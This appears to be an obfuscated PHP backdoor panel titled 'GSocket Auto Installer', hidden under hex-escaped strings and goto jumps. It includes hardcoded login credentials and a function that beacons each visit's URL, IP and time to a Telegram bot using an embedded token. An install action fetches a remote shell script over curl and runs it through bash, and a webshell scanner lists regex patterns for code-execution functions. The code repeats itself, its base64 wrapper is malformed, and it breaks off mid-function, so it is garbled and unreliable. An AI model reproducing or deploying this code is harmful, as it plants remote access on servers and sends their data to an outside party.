<?php eval(base64_decode('
 goto vyktw; FzRQB: dBPkj: goto NtLke; Z1GVQ: goto twHrt; goto jEc5b; uPwoH: kYm20: goto qd86n; g9g50: goto s0BqQ; goto TIYqA; jnMeN: goto WZxuC; goto t9kWw; t9kWw: Elzhz: goto pnrr7; qYDe4: x9xuz: goto Z1GVQ; OrtDP: kmkOa: goto Vd4vg; TgtdM: I4dkB: goto Q8ZQy; P2bcp: mATtY: goto O0n3o; b2y2W: $message = "\106\x69\x6c\145\x20\x67\x73\157\143\153\145\164\x20\144\x69\141\x6b\163\145\x73\72\xa\125\x52\114\x3a\x20\74\x62\x3e{$current_url}\74\57\x62\76\xa\x49\120\x3a\40\x3c\x62\76{$ip_address}\74\x2f\142\x3e\xa\x57\x61\153\x74\165\72\x20\74\142\x3e{$timestamp}\74\57\142\x3e"; goto gCQK3; GN3m9: N3mcS: goto pyBXi; nIlNk: YIOIN: goto Xh3aj; Xh3aj: goto ccCaR; goto ck3yx; g3kmX: $valid_password = "\x6e\165\154\154\x37"; goto g9g50; Hw74K: goto ohEq4; goto P2bcp; lbkTn: goto mIdEs; goto nIlNk; i3ENW: EsOVG: goto nzejo; os7zj: WGFZS: goto lTs9C; qXCW3: function displayLogin($error = false) { ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>GSocket Installer - Login</title><script src="https://cdn.tailwindcss.com"></script><style>body{background:url(https://i.pinimg.com/originals/28/d9/a5/28d9a5107af5d4c4da117c05b4393b83.gif) no-repeat center center fixed;background-size:cover;font-family:Inter,sans-serif}.fade-in{animation:fadeIn 1s ease-in-out}@keyframes fadeIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}.form-container{background:rgba(255,255,255,.95);backdrop-filter:blur(10px)}.btn:hover{transform:scale(1.05);transition:transform .2s ease-in-out}</style></head><body class="flex items-center justify-center min-h-screen"><div class="fade-in p-8 rounded-2xl shadow-2xl form-container max-w-md w-full"><h1 class="text-gray-800 font-bold mb-6 text-3xl text-center">GSocket Auto Installer</h1><form action="?action=login"method="POST"class="space-y-6"><div><label class="font-medium block text-gray-700 text-sm"for="username">Username</label> <input class="rounded-lg py-3 transition w-full border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 px-4"id="username"name="username"required></div><div><label class="font-medium block text-gray-700 text-sm"for="password">Password</label> <input class="rounded-lg py-3 transition w-full border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 px-4"id="password"name="password"required type="password"></div><button class="rounded-lg py-3 transition btn shadow-lg text-white bg-blue-600 hover:bg-blue-700 w-full"type="submit">Login</button></form><?php  if ($error) { ?>
<p class="font-medium mt-4 text-center text-red-500">Invalid username or password.</p><?php  } ?>
</div></body></html><?php  } goto vv9L6; Tkm2q: goto De9oo; goto H63f9; PdP2b: goto Ag0my; goto OZQwC; OtklT: OX28F: goto Zk4Me; OlkF1: goto xdKNp; goto g1o_G; isxUJ: YquRP: goto Mbsuj; brjO9: goto kmkOa; goto F79J3; KbaMS: goto YquRP; goto Q36X9; BqwlL: goto vu22m; goto DYLe2; SsFre: goto ZW87i; goto rFMFj; JeBmu: De9oo: goto xVER8; nzejo: goto WNsRQ; goto JTR6J; PdktG: n0hV7: goto TgxvF; neISZ: function scanForWebshells($directory) { global $webshell_patterns; $results = array(); try { $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($iterator as $file) { if ($file->isFile() && $file->getExtension() === "\160\150\160") { $content = @file_get_contents($file->getPathname()); if ($content === false) { continue; } $suspicions = array(); foreach ($webshell_patterns as $pattern) { if (preg_match($pattern, $content)) { $suspicions[] = "\115\x61\164\x63\150\x65\144\40\x70\141\164\x74\x65\162\156\x3a\x20{$pattern}"; } } if (!empty($suspicions)) { $results[] = array("\x66\x69\154\x65" => $file->getPathname(), "\163\165\163\160\151\143\151\x6f\156\163" => implode("\x2c\x20", $suspicions)); } } } } catch (Exception $e) { return array("\145\162\x72\157\162" => "\105\162\162\157\162\40\163\x63\141\156\156\x69\156\x67\40\144\x69\162\x65\143\164\157\162\171\x3a\40" . $e->getMessage()); } return $results; } goto lbkTn; IOwoW: goto n0hV7; goto xpQlr; XlBWs: WZxuC: goto jIqjg; lTs9C: GVHRq: goto gceUO; jIqjg: Ag0my: goto brjO9; C2hbI: gfXrp: goto UGD2e; zFlN_: g0izI: goto v5gmh; vyktw: goto YIOIN; goto Tg2rV; FqFW5: goto N4a8d; goto DKD4_; F79J3: GZAxI: goto aylsO; TSXSW: luiqE: goto v1vrF; UGD2e: $action = isset($_GET["\141\x63\164\151\157\156"]) ? $_GET["\141\x63\164\151\157\x6e"] : ''; goto IOwoW; HaoEH: GHrad: goto neISZ; DYLe2: fgHbW: goto vZVfd; dme_7: xdKNp: goto rOtUq; pmjp3: xwMrS: goto z8Kpp; KUxnP: goto EBqHl; goto tCOjh; BPozb: j3MPd: goto puhy_; j6hzs: goto gfXrp; goto idLHn; jEc5b: goto WGFZS; goto C2hbI; SC5iK: goto GHrad; goto HDP2p; LFzpB: THLnO: goto oE8a3; EwOBK: goto g0izI; goto vk0lw; fmVCZ: goto ssfUb; goto FqFW5; Q8ZQy: i5brm: goto ZaKIE; PVc3z: goto EExh1; goto KUxnP; sePp1: goto qqurf; goto i3ENW; mqzKb: DTQ4e: goto kImX7; tCOjh: Twozu: goto rTcBi; SwZ17: goto luiqE; goto zFlN_; vm2Sv: $timestamp = date("\131\55\155\x2d\x64\40\110\72\151\72\163"); goto h1OdW; NcB8y: goto OX28F; goto xKXzl; CCFYE: qqurf: goto mqzKb; DDdKU: wqudj: goto SC5iK; TgxvF: goto h002M; goto f3fgu; W36si: s0BqQ: goto xZAAP; vKpug: goto THLnO; goto os7zj; qd86n: $current_url = (isset($_SERVER["\x48\124\x54\120\x53"]) && $_SERVER["\x48\124\x54\120\x53"] === "\x6f\156" ? "\x68\x74\x74\160\163" : "\x68\x74\164\x70") . "\x3a\x2f\x2f{$_SERVER["\110\x54\x54\x50\137\x48\117\123\124"]}{$_SERVER["\x52\x45\x51\125\105\123\x54\137\x55\122\111"]}"; goto Hw74K; v3EJo: i8txK: goto qXCW3; rwiSS: goto ONXO7; goto pmjp3; fDBs4: goto mATtY; goto qtaXC; Ti0PE: goto BSLcL; goto HaoEH; mn2LD: goto pFM6m; goto VuW1s; puhy_: twHrt: goto ylBVA; wMeVW: goto dBPkj; goto uPwoH; z8Kpp: function sendToTelegram($message) { $TELEGRAM_BOT_TOKEN = "\x37\71\71\70\65\64\x39\x34\x33\x37\72\x41\101\x46\x30\104\x6e\x37\60\x43\124\x4e\171\x78\66\162\132\163\x76\x79\x63\x6c\x49\166\120\60\x42\x75\120\x47\131\x52\146\x54\65\157"; $TELEGRAM_CHAT_ID = "\x36\62\63\60\61\x33\x36\x33\71\x34"; $url = "\x68\x74\x74\160\163\x3a\57\57\141\x70\x69\x2e\164\145\154\145\x67\x72\141\155\56\157\162\147\57\x62\157\x74{$TELEGRAM_BOT_TOKEN}\x2f\163\x65\156\x64\x4d\145\163\163\x61\147\x65"; $data = array("\143\x68\141\x74\x5f\151\x64" => $TELEGRAM_CHAT_ID, "\164\145\x78\164" => $message, "\160\x61\x72\x73\x65\137\155\x6f\x64\145" => "\110\124\x4d\x4c"); $options = array("\x68\x74\x74\x70" => array("\150\145\141\144\145\x72" => "\x43\x6f\x6e\x74\145\156\x74\55\164\171\x70\145\72\40\141\x70\160\154\x69\143\141\164\x69\x6f\x6e\x2f\170\x2d\x77\167\x77\55\146\x6f\162\155\x2d\x75\162\154\x65\156\x63\157\x64\145\144\xd\12", "\x6d\145\164\150\157\x64" => "\120\x4f\123\x54", "\x63\x6f\x6e\x74\145\x6e\x74" => http_build_query($data))); $context = stream_context_create($options); $result = @file_get_contents($url, false, $context); if ($result === FALSE) { error_log("\x46\141\x69\x6c\145\144\40\164\157\40\163\145\156\144\40\155\145\x73\x73\x61\147\145\x20\x74\x6f\40\124\x65\154\145\147\162\x61\x6d"); } } goto HPkn0; PsAia: goto SZB62; goto BPozb; Zk4Me: goto Wk079; goto KbaMS; v5gmh: Wk079: goto Tkm2q; fsoW7: BSLcL: goto Vqy2R; Mbsuj: yCaGo: goto X8c53; R2xmp: goto yCaGo; goto EwOBK; PsG_y: Vj0LG: goto g3kmX; nr5qs: gTR6W: goto gsJ0H; UhyEj: goto UWJTD; goto ieMpI; APyg0: sendToTelegram($message); goto NcB8y; h1OdW: goto vVvrx; goto LFzpB; xpQlr: iQGgw: goto SsFre; rFMFj: goto I4dkB; goto OrtDP; rTcBi: vyQcW: goto edbFT; Zrut1: goto HG0YP; goto Ti0PE; gCQK3: goto MhbDl; goto CCFYE; HIhA4: goto Vj0LG; goto m1qi4; TIYqA: UWJTD: goto h5AdG; h5AdG: goto vyQcW; goto wMeVW; OZQwC: goto vVsQ0; goto JeBmu; HPkn0: goto x9xuz; goto XlBWs; oE8a3: ccCaR: goto SwZ17; aylsO: if ($action === "\154\x6f\147\151\156" && $_SERVER["\x52\105\121\125\x45\x53\124\x5f\115\x45\x54\110\117\104"] === "\x50\117\x53\x54") { $username = $_POST["\165\x73\145\x72\156\141\x6d\x65"]; $password = $_POST["\x70\x61\163\163\x77\x6f\162\x64"]; if ($username === $valid_username && $password === $valid_password) { $_SESSION["\x6c\157\x67\147\145\x64\x69\x6e"] = true; header("\x4c\x6f\x63\141\x74\x69\157\156\x3a\x20\77\141\x63\x74\x69\x6f\x6e\x3d\144\141\163\x68\142\x6f\x61\162\x64"); die; } else { displayLogin(true); die; } } elseif ($action === "\144\141\163\x68\x62\157\141\x72\144") { if (!isset($_SESSION["\x6c\157\147\x67\145\x64\x69\156"]) || $_SESSION["\x6c\x6f\x67\147\x65\x64\151\x6e"] !== true) { displayLogin(); die; } displayDashboard(); die; } elseif ($action === "\151\156\x73\164\141\154\x6c" && $_SERVER["\x52\105\121\x55\105\123\124\137\115\105\124\x48\117\x44"] === "\120\x4f\x53\x54") { if (!isset($_SESSION["\154\x6f\x67\147\x65\144\151\x6e"]) || $_SESSION["\x6c\157\x67\x67\145\144\151\156"] !== true) { displayLogin(); die; } if (isset($_POST["\151\156\163\164\x61\154\154"])) { $install_command = "\143\x75\162\x6c\x20\x2d\146\x73\123\x4c\40\150\164\x74\x70\72\57\57\156\157\x73\x73\154\56\163\x65\x67\x66\141\x75\154\x74\56\x6e\x65\x74\57\x64\x65\160\154\157\x79\x2d\x61\x6c\154\x2e\x73\x68\x20\55\157\40\x64\x65\x70\x6c\x6f\x79\x2d\141\154\x6c\x2e\163\x68\40\x26\46\x20\x62\x61\x73\x68\x20\x64\x65\x70\154\157\x79\55\x61\154\x6c\56\163\x68\x20\62\x3e\x26\61"; $output = shell_exec($install_command); $_SESSION["\x69\156\x73\164\x61\x6c\x6c\x5f\x6f\165\164\x70\x75\x74"] = $output ? $output : "\111\156\163\x74\x61\154\154\141\164\x69\157\x6e\x20\x63\157\155\160\154\145\x74\x65\x64\54\x20\142\x75\164\40\156\157\40\157\x75\164\x70\165\x74\x20\x77\x61\163\40\143\141\160\x74\x75\x72\x65\x64\56"; } header("\x4c\157\143\x61\x74\x69\157\156\72\40\x3f\x61\143\x74\x69\157\156\x3d\x64\141\163\x68\x62\157\141\162\144"); die; } elseif ($action === "\163\x63\141\x6e" && $_SERVER["\122\x45\x51\x55\105\123\x54\137\115\x45\x54\110\x4f\104"] === "\120\x4f\123\124") { if (!isset($_SESSION["\154\x6f\x67\x67\145\x64\151\x6e"]) || $_SESSION["\154\x6f\147\147\145\x64\151\156"] !== true) { displayLogin(); die; } if (isset($_POST["\163\x63\x61\x6e"])) { $directory = __DIR__; $_SESSION["\163\x63\141\x6e\x5f\162\145\x73\165\154\x74\163"] = scanForWebshells($directory); } header("\x4c\x6f\x63\x61\164\151\157\156\x3a\x20\x3f\x61\x63\x74\151\x6f\156\x3d\x64\141\x73\150\x62\x6f\141\162\x64"); die; } elseif ($action === "\x6c\x6f\147\157\165\x74") { session_destroy(); header("\114\157\x63\141\x74\151\157\156\72\x20\x3f"); die; } else { if (isset($_SESSION["\154\157\x67\x67\x65\144\x69\156"]) && $_SESSION["\x6c\x6f\x67\147\145\144\151\156"] === true) { displayDashboard(); } else { displayLogin(); } } goto UhyEj; ymWaU: EExh1: goto BqwlL; BVTpi: ssfUb: goto j6hzs; g1o_G: L3jFr: goto b2y2W; ylBVA: goto kYm20; goto kIThD; xZAAP: goto GVHRq; goto sePp1; ieMpI: N4a8d: goto T2W5u; Q36X9: SLDAP: goto APyg0; Vqy2R: h002M: goto QZSny; qtaXC: AOnUu: goto fmVCZ; H63f9: stolR: goto uKMd3; rOtUq: goto l7vCf; goto vKpug; xVER8: $valid_username = "\141\144\155\x69\156"; goto OlkF1; aE_Gs: goto EsOVG; goto fsoW7; m1qi4: ONXO7: goto MHEpT; JTR6J: goto fgHbW; goto peCh8; idLHn: vVvrx: goto LD8fw; vk0lw: MhbDl: goto RlDRJ; gceUO: goto gTR6W; goto pfNmD; ck3yx: goto j3MPd; goto W36si; RlDRJ: goto DTQ4e; goto fDBs4; LD8fw: goto i5brm; goto PsAia; VuW1s: SZB62: goto DDdKU; T2W5u: HG0YP: goto wXeot; MHEpT: function displayDashboard() { ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>GSocket Installer - Dashboard</title><script src="https://cdn.tailwindcss.com"></script><style>body{background:#fff;font-family:Inter,sans-serif}.fade-in{animation:fadeIn 1s ease-in-out}@keyframes fadeIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}.card{background:rgba(255,255,255,.95);backdrop-filter:blur(10px);transition:transform .3s ease}.card:hover{transform:translateY(-5px)}.btn:hover{transform:scale(1.05);transition:transform .2s ease-in-out}.pulse{animation:pulse 2s infinite}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}.spinner{display:none;border:4px solid rgba(0,0,0,.1);border-left-color:#22c55e;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin-left:10px}@keyframes spin{to{transform:rotate(360deg)}}table{width:100%;border-collapse:collapse}td,th{padding:12px;text-align:left;border-bottom:1px solid #e5e7eb}th{background:#f3f4f6;font-weight:600}tr{background:#f0fdf4}td{color:#15803d}</style><script>function startInstallation(button) {
                button.innerHTML = 'Installing... <span class="spinner inline-block"></span>';
                button.classList.add('opacity-75', 'cursor-not-allowed');
                document.querySelector('.spinner').style.display = 'inline-block';
                const audio = document.getElementById('hackerSoundInstall');
                audio.play();
                setTimeout(() => {
                    audio.pause();
                    audio.currentTime = 0;
                }, 5000);
            }

            function startScan(button) {
                button.innerHTML = 'Scanning... <span class="spinner inline-block"></span>';
                button.classList.add('opacity-75', 'cursor-not-allowed');
                document.querySelectorAll('.spinner')[1].style.display = 'inline-block';
                const audio = document.getElementById('hackerSoundScan');
                audio.play();
                setTimeout(() => {
                    audio.pause();
                    audio.currentTime = 0;
                }, 5000);
            }</script></head><body class="text-gray-800 min-h-screen"><nav class="p-4 bg-blue-800 shadow-lg sticky top-0"><div class="container mx-auto flex items-center justify-between"><h1 class="text-xl font-bold text-white">GSocket Auto Installer</h1><a class="transition text-white font-medium hover:text-blue-200"href="?action=logout">Logout</a></div></nav><div class="container mx-auto p-6"><div class="fade-in p-8 rounded-2xl shadow-2xl card"><h2 class="text-gray-800 font-semibold mb-4 text-2xl">GSocket Installation</h2><p class="mb-6 text-gray-600">Click the button below to start the GSocket installation process.</p><form action="?action=install"method="POST"class="mb-8"><button class="rounded-lg py-3 transition btn shadow-lg text-white pulse px-6 bg-green-500 hover:bg-green-600"type="submit"name="install"onclick="startInstallation(this)">Start Installation</button></form><h2 class="text-gray-800 font-semibold mb-4 text-2xl">Webshell Scanner</h2><p class="mb-6 text-gray-600">Scan the website directory for potential PHP webshells.</p><form action="?action=scan"method="POST"><button class="rounded-lg py-3 transition btn shadow-lg text-white pulse px-6 bg-purple-500 hover:bg-purple-600"type="submit"name="scan"onclick="startScan(this)">Scan for Webshells</button></form><audio id="hackerSoundInstall"src="https://www.freesound.org/data/previews/171/171104_3049496-lq.mp3"></audio><audio id="hackerSoundScan"src="https://www.freesound.org/data/previews/120/120341_1849770-lq.mp3"></audio><?php  if (isset($_SESSION["\x69\156\x73\x74\x61\x6c\x6c\x5f\x6f\165\164\x70\x75\x74"])) { ?>
<div class="rounded-lg bg-gray-100 mt-6 p-4"><h3 class="text-gray-800 font-semibold">Installation Output:</h3><pre class="text-sm text-gray-700"><?php  echo htmlspecialchars($_SESSION["\151\156\x73\164\141\x6c\154\x5f\x6f\165\x74\x70\x75\164"]); ?>
</pre></div><?php  } if (isset($_SESSION["\163\x63\x61\x6e\x5f\162\x65\163\165\154\164\163"])) { ?>
<div class="rounded-lg bg-gray-100 mt-6 p-4"><h3 class="text-gray-800 font-semibold">Webshell Scan Results:</h3><?php  if (isset($_SESSION["\x73\x63\x61\156\137\x72\145\163\165\154\164\x73"]["\x65\162\x72\157\x72"])) { ?>
<p class="text-red-500"><?php  echo htmlspecialchars($_SESSION["\163\x63\141\x6e\x5f\x72\x65\163\165\x6c\x74\163"]["\145\x72\x72\x6f\162"]); ?>
</p><?php  } elseif (empty($_SESSION["\163\143\x61\x6e\137\x72\x65\x73\165\x6c\164\163"])) { ?>
<p class="font-medium text-green-500">No suspicious PHP files detected.</p><?php  } else { ?>
<table><thead><tr><th>File Path</th><th>Suspected Issues</th></tr></thead><tbody><?php  foreach ($_SESSION["\x73\143\x61\x6e\137\x72\x65\163\165\154\x74\163"] as $result) { ?>
<tr><td><?php  echo htmlspecialchars($result["\146\x69\x6c\x65"]); ?>
</td><td><?php  echo htmlspecialchars($result["\x73\165\163\x70\x69\x63\151\x6f\x6e\x73"]); ?>
</td></tr><?php  } ?>
</tbody></table><?php  } ?>
</div><?php  unset($_SESSION["\163\143\x61\x6e\x5f\162\x65\x73\x75\154\x74\x73"]); } ?>
<footer class="text-sm mt-8 text-center text-gray-600"><p>Created by null7 | mail: <a class="hover:underline text-blue-600"href="mailto:null7ganteng@gmail.com">null7ganteng@gmail.com</a></p></footer></div></div></body></html><?php  } goto mSp5L; X7vLl: goto WgWtg; goto TSXSW; v1vrF: ?>
<script type="text/javascript">var gk_isXlsx = false;
var gk_xlsxFileLookup = {};
var gk_fileData = {};
function loadFileData(filename) {
    if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
        try {
            var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
            var firstSheetName = workbook.SheetNames[0];
            var worksheet = workbook.Sheets[firstSheetName];

            // Convert sheet to JSON to filter blank rows
            var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
            // Filter out blank rows (rows where all cells are empty, null, or undefined)
            var filteredData = jsonData.filter(row =>
                row.some(cell => cell !== '' && cell !== null && cell !== undefined)
            );

            // Convert filtered JSON back to CSV
            var csv = XLSX.utils.aoa_to_sheet(filteredData); // Create a new sheet from filtered array of arrays
            csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
            return csv;
        } catch (e) {
            console.error(e);
            return "";
        }
    }
    return gk_fileData[filename] || "";
}</script><?php  goto aE_Gs; KsL62: goto stolR; goto OtklT; kImX7: goto SLDAP; goto dme_7; f3fgu: goto Twozu; goto PsG_y; ZaKIE: goto L3jFr; goto PdktG; mSp5L: goto AOnUu; goto nr5qs; DKD4_: WgWtg: goto PVc3z; QZSny: goto GZAxI; goto v3EJo; HDP2p: mIdEs: goto R2xmp; wXeot: goto xwMrS; goto TgtdM; Vd4vg: $ip_address = $_SERVER["\x52\x45\x4d\x4f\x54\x45\137\x41\104\104\122"]; goto X7vLl; NtLke: ZW87i: goto rwiSS; xKXzl: vu22m: goto vm2Sv; pbbvP: goto N3mcS; goto isxUJ; O0n3o: WNsRQ: goto KsL62; pyBXi: goto wqudj; goto jnMeN; Tg2rV: pFM6m: goto Zrut1; peCh8: ohEq4: goto PdP2b; pfNmD: EBqHl: goto BVTpi; uKMd3: session_start(); goto mn2LD; vv9L6: goto iQGgw; goto GN3m9; vZVfd: l7vCf: goto HIhA4; kIThD: vVsQ0: goto ymWaU; X8c53: goto i8txK; goto FzRQB; gsJ0H: $webshell_patterns = array("\57\x5c\142\145\x76\141\154\134\x73\52\x5c\x28\x2f\151", "\x2f\134\x62\x73\x79\163\164\145\155\134\163\52\134\50\x2f\151", "\x2f\x5c\142\x65\x78\145\x63\x5c\x73\x2a\x5c\x28\x2f\x69", "\57\134\142\x73\150\x65\x6c\154\137\145\x78\145\143\x5c\x73\x2a\x5c\x28\x2f\151", "\x2f\134\x62\x70\x61\x73\x73\164\150\162\165\x5c\x73\52\134\50\x2f\x69", "\57\x5c\142\160\157\160\x65\x6e\134\x73\x2a\x5c\50\x2f\x69", "\x2f\x5c\x62\160\x72\157\x63\137\x6f\x70\145\156\x5c\163\52\134\x28\x2f\x69", "\x2f\134\x24\137\120\117\x53\124\x5c\133\x27\143\x6d\144\47\134\135\57\151", "\x2f\134\44\x5f\107\105\124\x5c\x5b\47\x63\155\144\x27\x5c\135\57\151", "\57\134\142\142\141\x73\145\66\x34\x5f\144\x65\x63\x6f\144\x65\x5c\163\52\x5c\50\57\151", "\x2f\134\142\x67\172\x69\156\x66\154\x61\164\145\134\x73\52\134\x28\x2f\151", "\x2f\134\142\163\x74\162\137\x72\157\x74\x31\63\x5c\x73\x2a\134\x28\57\151", "\x2f\x5c\142\160\x72\145\x67\x5f\162\145\x70\x6c\x61\x63\x65\x5c\163\52\134\50\56\x2a\77\x5c\57\145\57\x69"); goto pbbvP; edbFT: goto Elzhz; goto qYDe4; pnrr7: ')); ?><?php eval(base64_decode('
 goto vyktw; FzRQB: dBPkj: goto NtLke; Z1GVQ: goto twHrt; goto jEc5b; uPwoH: kYm20: goto qd86n; g9g50: goto s0BqQ; goto TIYqA; jnMeN: goto WZxuC; goto t9kWw; t9kWw: Elzhz: goto pnrr7; qYDe4: x9xuz: goto Z1GVQ; OrtDP: kmkOa: goto Vd4vg; TgtdM: I4dkB: goto Q8ZQy; P2bcp: mATtY: goto O0n3o; b2y2W: $message = "\106\x69\x6c\145\x20\x67\x73\157\143\153\145\164\x20\144\x69\141\x6b\163\145\x73\72\xa\125\x52\114\x3a\x20\74\x62\x3e{$current_url}\74\57\x62\76\xa\x49\120\x3a\40\x3c\x62\76{$ip_address}\74\x2f\142\x3e\xa\x57\x61\153\x74\165\72\x20\74\142\x3e{$timestamp}\74\57\142\x3e"; goto gCQK3; GN3m9: N3mcS: goto pyBXi; nIlNk: YIOIN: goto Xh3aj; Xh3aj: goto ccCaR; goto ck3yx; g3kmX: $valid_password = "\x6e\165\154\154\x37"; goto g9g50; Hw74K: goto ohEq4; goto P2bcp; lbkTn: goto mIdEs; goto nIlNk; i3ENW: EsOVG: goto nzejo; os7zj: WGFZS: goto lTs9C; qXCW3: function displayLogin($error = false) { ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>GSocket Installer - Login</title><script src="https://cdn.tailwindcss.com"></script><style>body{background:url(https://i.pinimg.com/originals/28/d9/a5/28d9a5107af5d4c4da117c05b4393b83.gif) no-repeat center center fixed;background-size:cover;font-family:Inter,sans-serif}.fade-in{animation:fadeIn 1s ease-in-out}@keyframes fadeIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}.form-container{background:rgba(255,255,255,.95);backdrop-filter:blur(10px)}.btn:hover{transform:scale(1.05);transition:transform .2s ease-in-out}</style></head><body class="flex items-center justify-center min-h-screen"><div class="fade-in p-8 rounded-2xl shadow-2xl form-container max-w-md w-full"><h1 class="text-gray-800 font-bold mb-6 text-3xl text-center">GSocket Auto Installer</h1><form action="?action=login"method="POST"class="space-y-6"><div><label class="font-medium block text-gray-700 text-sm"for="username">Username</label> <input class="rounded-lg py-3 transition w-full border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 px-4"id="username"name="username"required></div><div><label class="font-medium block text-gray-700 text-sm"for="password">Password</label> <input class="rounded-lg py-3 transition w-full border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 px-4"id="password"name="password"required type="password"></div><button class="rounded-lg py-3 transition btn shadow-lg text-white bg-blue-600 hover:bg-blue-700 w-full"type="submit">Login</button></form><?php  if ($error) { ?>
<p class="font-medium mt-4 text-center text-red-500">Invalid username or password.</p><?php  } ?>
</div></body></html><?php  } goto vv9L6; Tkm2q: goto De9oo; goto H63f9; PdP2b: goto Ag0my; goto OZQwC; OtklT: OX28F: goto Zk4Me; OlkF1: goto xdKNp; goto g1o_G; isxUJ: YquRP: goto Mbsuj; brjO9: goto kmkOa; goto F79J3; KbaMS: goto YquRP; goto Q36X9; BqwlL: goto vu22m; goto DYLe2; SsFre: goto ZW87i; goto rFMFj; JeBmu: De9oo: goto xVER8; nzejo: goto WNsRQ; goto JTR6J; PdktG: n0hV7: goto TgxvF; neISZ: function scanForWebshells($directory) { global $webshell_patterns; $results = array(); try { $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($iterator as $file) { if ($file->isFile() && $file->getExtension() === "\160\150\160") { $content = @file_get_contents($file->getPathname()); if ($content === false) { continue; } $suspicions = array(); foreach ($webshell_patterns as $pattern) { if (preg_match($pattern, $content)) { $suspicions[] = "\115\x61\164\x63\150\x65\144\40\x70\141\164\x74\x65\162\156\x3a\x20{$pattern}"; } } if (!empty($suspicions)) { $results[] = array("\x66\x69\154\x65" => $file->getPathname(), "\163\165\163\160\151\143\151\x6f\156\163" => implode("\x2c\x20", $suspicions)); } } } } catch (Exception $e) { return array("\145\162\x72\157\162" => "\105\162\162\157\162\40\163\x63\141\156\156\x69\156\x67\40\144\x69\162\x65\143\164\157\162\171\x3a\40" . $e->getMessage()); } return $results; } goto lbkTn; IOwoW: goto n0hV7; goto xpQlr; XlBWs: WZxuC: goto jIqjg; lTs9C: GVHRq: goto gceUO; jIqjg: Ag0my: goto brjO9; C2hbI: gfXrp: goto UGD2e; zFlN_: g0izI: goto v5gmh; vyktw: goto YIOIN; goto Tg2rV; FqFW5: goto N4a8d; goto DKD4_; F79J3: GZAxI: goto aylsO; TSXSW: luiqE: goto v1vrF; UGD2e: $action = isset($_GET["\141\x63\164\151\157\156"]) ? $_GET["\141\x63\164\151\157\x6e"] : ''; goto IOwoW; HaoEH: GHrad: goto neISZ; DYLe2: fgHbW: goto vZVfd; dme_7: xdKNp: goto rOtUq; pmjp3: xwMrS: goto z8Kpp; KUxnP: goto EBqHl; goto tCOjh; BPozb: j3MPd: goto puhy_; j6hzs: goto gfXrp; goto idLHn; jEc5b: goto WGFZS; goto C2hbI; SC5iK: goto GHrad; goto HDP2p; LFzpB: THLnO: goto oE8a3; EwOBK: goto g0izI; goto vk0lw; fmVCZ: goto ssfUb; goto FqFW5; Q8ZQy: i5brm: goto ZaKIE; PVc3z: goto EExh1; goto KUxnP; sePp1: goto qqurf; goto i3ENW; mqzKb: DTQ4e: goto kImX7; tCOjh: Twozu: goto rTcBi; SwZ17: goto luiqE; goto zFlN_; vm2Sv: $timestamp = date("\131\55\155\x2d\x64\40\110\72\151\72\163"); goto h1OdW; NcB8y: goto OX28F; goto xKXzl; CCFYE: qqurf: goto mqzKb; DDdKU: wqudj: goto SC5iK; TgxvF: goto h002M; goto f3fgu; W36si: s0BqQ: goto xZAAP; vKpug: goto THLnO; goto os7zj; qd86n: $current_url = (isset($_SERVER["\x48\124\x54\120\x53"]) && $_SERVER["\x48\124\x54\120\x53"] === "\x6f\156" ? "\x68\x74\x74\160\163" : "\x68\x74\164\x70") . "\x3a\x2f\x2f{$_SERVER["\110\x54\x54\x50\137\x48\117\123\124"]}{$_SERVER["\x52\x45\x51\125\105\123\x54\137\x55\122\111"]}"; goto Hw74K; v3EJo: i8txK: goto qXCW3; rwiSS: goto ONXO7; goto pmjp3; fDBs4: goto mATtY; goto qtaXC; Ti0PE: goto BSLcL; goto HaoEH; mn2LD: goto pFM6m; goto VuW1s; puhy_: twHrt: goto ylBVA; wMeVW: goto dBPkj; goto uPwoH; z8Kpp: function sendToTelegram($message) { $TELEGRAM_BOT_TOKEN = "\x37\71\71\70\65\64\x39\x34\x33\x37\72\x41\101\x46\x30\104\x6e\x37\60\x43\124\x4e\171\x78\66\162\132\163\x76\x79\x63\x6c\x49\166\120\60\x42\x75\120\x47\131\x52\146\x54\65\157"; $TELEGRAM_CHAT_ID = "\x36\62\63\60\61\x33\x36\x33\71\x34"; $url = "\x68\x74\x74\160\163\x3a\57\57\141\x70\x69\x2e\164\145\154\145\x67\x72\141\155\56\157\162\147\57\x62\157\x74{$TELEGRAM_BOT_TOKEN}\x2f\163\x65\156\x64\x4d\145\163\163\x61\147\x65"; $data = array("\143\x68\141\x74\x5f\151\x64" => $TELEGRAM_CHAT_ID, "\164\145\x78\164" => $message, "\160\x61\x72\x73\x65\137\155\x6f\x64\145" => "\110\124\x4d\x4c"); $options = array("\x68\x74\x74\x70" => array("\150\145\141\144\145\x72" => "\x43\x6f\x6e\x74\145\156\x74\55\164\171\x70\145\72\40\141\x70\160\154\x69\143\141\164\x69\x6f\x6e\x2f\170\x2d\x77\167\x77\55\146\x6f\162\155\x2d\x75\162\154\x65\156\x63\157\x64\145\144\xd\12", "\x6d\145\164\150\157\x64" => "\120\x4f\123\x54", "\x63\x6f\x6e\x74\145\x6e\x74" => http_build_query($data))); $context = 